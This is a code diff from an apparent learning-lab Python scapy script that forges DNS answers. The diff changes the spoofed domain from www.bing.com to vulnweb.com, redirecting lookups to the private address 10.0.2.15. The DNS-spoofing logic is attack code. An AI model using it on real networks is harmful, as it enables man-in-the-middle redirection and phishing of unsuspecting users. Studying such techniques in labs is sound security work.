@@ -8,7 +8,7 @@ def process_packet(packet):
     #DNSRR -> [ DNS Resource Record ]
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "vulnweb.com" in qname:
             print("[+] Spoofing target")
             #create a DNS answer to spoof the target that the ip of www.bing.com is 10.0.2.15
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
